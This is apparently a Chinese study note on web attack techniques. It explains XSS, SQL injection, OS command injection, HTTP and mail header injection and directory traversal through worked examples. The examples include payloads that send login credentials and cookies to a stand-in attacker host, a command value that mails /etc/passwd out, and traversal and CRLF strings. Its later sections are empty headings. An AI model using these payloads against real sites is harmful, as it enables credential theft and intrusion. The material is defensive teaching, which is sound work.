## web的攻击技术

互联网上的攻击大都将web站点作为目标，具体有哪些手段，会造成什么样的影响呢；

### 1 针对web的攻击技术

应用http协议的服务器和客户端，以及运行在服务器上的web应用作为攻击目标；

1. http不具备必要的安全功能

现在web网站都会使用会话管理加密处理等安全性方面的功能，而http协议本身不具备这些；
（安全壳协议（SSH）是一个加密的网络协议，用于在不安全的网络上安全地操作网络服务。其最显著的应用是远程登录和命令行执行）

2. 在客户端即可篡改请求
在http请求报文内加载攻击代码，就能发起对web应用的攻击；通过url查询字段或表单/http首部/Cookie等途径把攻击代码传入，若这时web应用存在安全漏洞，那内部信息就会遭到篡改，或者被攻击者拿到管理权限；

3 针对web应用的攻击模式

* 主动攻击：攻击者通过直接访问web应用，把攻击代码传入的模式；
* 被动攻击：利用圈套策略执行攻击代码的攻击模式

> 以服务器为目标的主动攻击

具有代表性的攻击是<b>SQL注入攻击和OS命令注入攻击</b>
```
        1执行攻击代码
攻击者---------------------- 服务器
                            \ 2 信息泄密；执行命令等
                             \
                              `-----> DB
```

> 以服务器为目标的被动攻击

具有代表性的是<b>跨站脚本攻击和跨站点请求伪造</b>；

常用的攻击模式如下：
1. 攻击者诱使用户触发已设置好的陷阱，而陷阱会启动发送已嵌入攻击代码的http请求；
2. 当用户不知不觉中招后，用户的的浏览器或者邮件客户端就会触发这个陷阱
3. 中招后的用户浏览器就会把含有攻击代码的http请求发送给作为攻击者目标的web应用，运行攻击代码
4. 执行完攻击代码，存在安全漏洞的web应用会成为攻击者的跳板，可能导致用户所持的Cookie等个人信息被窃取，登陆状态中的用户权限遭到恶意滥用等后果；
```
主要攻击用户的资源和权限
      
              4 执行攻击代码的后果是用户所持的cookie等
                    被盗取/用户权限遭恶意滥用
        -------------------------------------------------》 
 用户                                                        攻击代码服务器
  ^    《------------------------------------------------
   \               3 用户的浏览器运行攻击代码
    \
     \ 2 用户的浏览器触发事先已设好陷阱的http请求 
      \_______________________________________ 攻击者（在web页面或邮件内设置陷阱）
          1 陷阱诱导

```

利用被动攻击 可以利用用户的身份攻击企业内部网络

### 2 因输出值转义不完全引发的安全漏洞

实施web应用安全对策可大致分为以下两部分：

A 客户端验证

保留客户端验证只是为了尽早的辨识输入错误，起到提高ui体验的作用，

B web应用端（服务端）验证
 
  * 输入值验证：通常是指检查是否是符合系统业务逻辑的数值或检查字符编码等预防对策
  * 输出值转义：从数据库或文件系统/html/邮件等输出web应用处理的数据之际，针对输出做值转义处理是一项至关重要的安全策略，当输出值转义不完全时，会因触发攻击者传入的攻击代码，而给输出对象带来损害；
  
  
1. 跨站脚本攻击（Cross-Site Scripting Xss）

是指通过存在安全漏洞的web网站注册用户的浏览器内运行非法的html标签或者js代码进行的一种攻击；
影响如下：

* 利用虚假输入表单骗取用户个人信息
* 利用脚本窃取用户的cookie值，被害者在不知情的情况下，帮助攻击者发生恶意请求
* 显示伪造的文章或图片

> 跨站脚本攻击案例

a: 在动态生成html处发生，以编辑个人信息为例子：

```
正常情况下：
姓名：________
邮箱：________
简介：________

    确认修改

```
在确认后将编辑的内容正常展示，<b>异常情况下</b>但是当输入的姓名带有html标签或者利用js会造成更严重的后果
比如将姓名输入为：<s>显示的内容将会带有下划线</s>

这里虽然不会造成太严重的后果，但是利用js可以


b: XSS是攻击者利用预先设置的陷阱触发的被动攻击

当网站通过地址栏中的URI的查询字段指定ID，即相当于在表单内自动填写字符串的功能；而在这个地方，隐藏着可执行跨站脚本攻击的漏洞；

```
http://example.js/login?ID=yama

某登陆网站：
ID: yama
PW:_____

攻击者会据此创建下面这段嵌入恶意代码的url；隐藏植入事先准备好的欺诈邮件中或者web页面内；诱使用户去点击该url；

http://example.js/login?ID="><script>var+f=document.getElementById("login"); +f.action="http://hackr.jp/pwget";+f.method=>"get";</script><span+s="
浏览器打开该uri后，直观感觉没有发生任何变化；但是设置好的脚本已经开发运行了；当用户输入id和pw后就会直接发送到攻击者的网站（即hackr.jp），导致个人登陆信息被窃取；
两种方式请求是对应的html源代码如下：
```
```
<div class="logo">
  <img src="/img/logo.png" alt="某网站">
</div>
<form action="http://example.jp/login" method="post" id="login">
  <div class="input_id">
    ID  <input type="text" name="ID" value="yama">
  </div>
</form>

<!-- 被嵌入攻击代码后 -->
<div class="logo">
  <img src="/img/logo.png" alt="某网站">
</div>
<form action="http://example.jp/login" method="post" id="login">
  <div class="input_id">
    ID  <input type="text" name="ID" value=""><script>var f=document.getElementById("login"); f.action="http://hackr.jp/pwget"; f.method="get";</script><span s="" />
  </div>
</form>
```

> 对用户cookie的窃取攻击

除了上面的在表单中设下圈套之外，下面的恶意构造的脚本也同样能够以跨站脚本攻击方式，窃取用户的cookie信息

```
<script src="http://hackr.jp/xss.js"></script>

xss.js如下内容
var content = encodeURIComponent(document.cookie)
document.write("<img src=http://hackr.jp/?>");
document.write(content)
document.write(">")

```
在存在漏洞的网站运行后 cookie信息就会发送至攻击者的网站
```
http://example.js/login?ID="><script src=http://hackr.jp/xss.js></script>"
```
注意：针对这种攻击cookie内加上httponly属性（<b>HttpOnly会禁止js访问cookie</b>, 服务端可正常读取）可以避免这种情况；
```
客户端                                                         服务器
    1 ----> 发送已登陆的信息（用户id，密码）    ---->
            
     <----- 发送包含session id的cookie    <----  2
            向用户发放sessionid 记录认证状态
            set-cookie: JSESSIONID=94f18be8c47e4d329...
            set-cookie: JSESSIONID=94f18be8c47e4d329b6...; Path=/..; HttpOnly; SameSite=lax
            
    3 ----> 发送包含sessionid的cookie    ---->  
            通过验证sessionid判定对方是真实用户
            cookie: JSESSIONID=794f18be8c47e4d329...; experim...
```

2. SQL注入攻击：是指针对web应用使用的数据库，通过运行非法的SQL而产生的攻击

> 会执行非法SQL的SQL注入攻击

如果在使用SQL语句方式上存在漏洞，就有可能被恶意注入非法SQL语句，SQL注入攻击可能造成以下影响

* 1 非法查看和篡改数据库的内容
* 2 规避认证
* 3 执行和数据库服务器业务关联的程序

> SQL注入攻击案例

以购物网站（书城）搜索功能为例：以作者为搜索条件；

正常操作如下：
```
以"朴灵"作为关键字进行搜索
访问http:examole.com/search?q=朴灵

对应的SQL语句
SELECT * FROM bookTbl WHERE author = '朴灵' and flag = 1;
从bookTbl表中，显示满足author = '朴灵' and flag = 1（可售）所在行的数据

```

注入攻击的操作示例
```
以"朴灵'--"作为关键字进行搜索
访问http:examole.com/search?q=朴灵'--

对应的SQL语句
SELECT * FROM bookTbl WHERE author = '朴灵'--' and flag = 1;
从bookTbl表中，显示满足author = '朴灵' and flag = 1（可售）所在行的数据
(-- 之后的内容会自动判为注释，因此flag=1这个条件就被直接忽略了)

```

> SQL注入攻击破坏SQL语句结构的案例

在之前的攻击案例中,会把"朴灵'--"字符串赋值给$q
```
SELECT * FROM bookTbl WHERE author = '$q' and flag = 1;

SELECT * FROM bookTbl WHERE author = '朴灵'--' and flag = 1;

遇到’ 后面的--不属于author字面值回被解析成其他的语句，当这个语句是其他内容比如篡改内容等，将会有不同程度的损失
```

3. OS命令注入攻击：是指通过web应用，执行非法的操作系统命令达到攻击的目的

只要在能调用shell函数的地方就有存在被攻击的风险；os命令注入攻击可以向shell发送命令，让windows或者linux操作系统的命令行启动程序；（即，通过os注入攻击可执行os上安装着的各种程序）

> OS注入攻击案例

以咨询表单的发送功能为例：该功能可将用户咨询邮件按已填写的对方邮箱地址发送过去；下面摘选的核心代码
```
my $adr = $q->param('mailadress');
open(MALL, "| /usr/sbin/sendmail $adr");
print MALL "From: info@example.com\n"
```
上面的open函数会调用sendmail命令发送邮件，而指定的邮件发送地址即$adr的值；

攻击者将下面的值作为邮件地址

```
; cat /etc/passwd | mail hack@example.jp
```
程序接收该值，构成一下命令组合
```
| /usr/sbin/sendmail ; cat /etc/passwd | mail hack@example.jp
```
攻击者输入值中含有"；", 这个符号在os命令中，会被解析为分隔多个执行命令的标记；
分隔后，sendmail会执行cat /etc/passwd | mail hack@example.jp；结果含有linux账户信息的 /etc/passwd 的文件，就以邮件的形式发送给了hack@example.jp

[os命令注入参考文章](https://zhuanlan.zhihu.com/p/48536948)


4. HTTP首部注入攻击:是指攻击者通过在响应首部字段内插入换行，添加任意响应首部或主体的攻击；（被动攻击的一种）

向响应首部内添加内容的攻击称为http响应截断攻击（http response splitting attack）；
web应用有时会将外部接收到的值赋值给响应首部字段：
```
Location: httl://www.example.com/a.cgi?q=12345
Set-Cookie: UID=12345

* 12345 就是插入值， 这个插入值中可能被插入换行来进行攻击
```
造成的影响：

* 设置任何cookie信息
* 重定向至任何的url
* 显示任意的主体（http响应截断攻击）

> HTTP首部注入攻击案例

以宣读某个类别后即可跳转至各类别对应页面的功能为例；该功能为每一个类别设定了一个ID，一旦选定某个类别，
该ID值回反映在响应内的Location首部字段内，形如Location: http://www.example.com/?cat=101 令浏览器发生重定向跳转；
```
浏览器页面：

请选定内容
书籍  101
音乐  102
游戏  103

响应首部Location: http://www.example.com/?cat=101
```
攻击者以下面的内容替换之前的类别id后发送请求
```
101%0D%0ASet-Cookie:+SID=123456789

%0D%0A在http首部中代表换行符；紧接着的是可强制将攻击者网站（http://hackr.jp/）的会话id设置成SID=123456789的Set-Cookie首部字段；

Location: http://www.example.com/?cat=101（%0D%0A：换行符）
Set-Cookie：SID=123456789

此刻set-cookie已生效，攻击者可指定修改任意的cookie信息，也可在响应中插入任意的首部字段；通过和会话固定攻击攻击组合，攻击者可以伪装成用户；
```

> HTTP响应截断攻击

用在http首部注入的一种攻击；攻击顺序相同，但是要将两个%0D%0A%0D%0A并排插入字符串后发送；利用这两个连续的换行可做出http首部与主体分隔所需的空行了，这样就能显示伪造的主体，达到攻击的目的；
```
%0D%0A%0D%0A<html><head><title>之后，想要显示的网页内容<!--
```
在可能进行http首部注入的环节，通过发送上面的字符串，返回结果得到以下这种响应；
```
Set-Cookie：UID=(%0D%0A: 换行符)
(%0D%0A: 换行符)
<html><head><title>之后，想要显示的网页内容 => 
<!-- (原来页面对应的首部字段和主体部分全视为注释)
```
利用该攻击，已触发陷阱的用户浏览器回显示伪造的web页面，在让用户输入自己的个人信息等，可达到和跨站脚本相同的效果；

5. 邮件首部注入攻击：是指web应用中国呢的邮件发送功能，攻击者通过向邮件首部To或Subject内任意添加非法内容发起的攻击

利用存在安全漏洞的web网站，可对任意邮件地址发送广告邮件或病毒邮件

> 邮件首部注入攻击案例

下面以web页面中咨询表单为例；该功能可在表单内填入咨询者的邮件地址及咨询内容后，以邮件的形式发送给邮件管理员；

```
某咨询网站：

请填写以下表单后发送
   邮件地址：______
   咨询内容：______

攻击者将一下数据作为邮件地址发送请求：
bob@hackr.js%0D%0ABcc:user@example.com
%0D%0A在邮件报文中代表换行符；一旦咨询表单所在的web应用接受了这个换行符，就可能实现对Bcc邮件地址的追加发送，而这原本是无法指定的
```
另外，像下面一样，使用两个连续的换行符有可能篡改邮件文本的内容并发送
```
bob@hackr.js%0D%0A%0D%0Atest message******
```

6. 目录遍历攻击:是指对本无意公开的文件目录，通过非法截断其路径后，达成访问目的的一种攻击；也称路径遍历攻击；

用户可以通过 cd ../等相对路径定位到/etc/passwd等绝对路径上，因此服务器傻姑娘的任意文件或者文件目录皆有可能被访问到，这样就可能非法浏览，篡改，删除web服务器上的文件；
应该关闭指定文件夹的访问权限；

> 目录遍历攻击案例

以显示读取文件功能为例；该功能通过以下查询字段，指定某个文件名；然后从/www/log/文件目录下读取这个指定的文件；

```
http://example.com/read.php?log=0401.log
```
攻击者设置如下查询字段后发出请求：
```
http://example.com/read.php?log=../../etc/passwd
```

查询字段为了读取攻击者盯上的/etc/passwd文件，会从/www/log/目录开始定位相对路径；如果这份read.php脚本接受对指定目录的访问请求处理，那原本不公开的文件就存在可被访问的风险；

```
｜
｜------www----------read.php
｜            |
｜            |______log _______0401.log
｜
｜
｜------etc-----passwd
｜
```

7. 远程文件包含漏洞

> 远程文件包含漏洞案例


### 3 因设置或设计上的缺陷引发的安全漏洞






### 4 因会话管理疏忽引发的安全漏洞




### 5 其他安全漏洞


















  









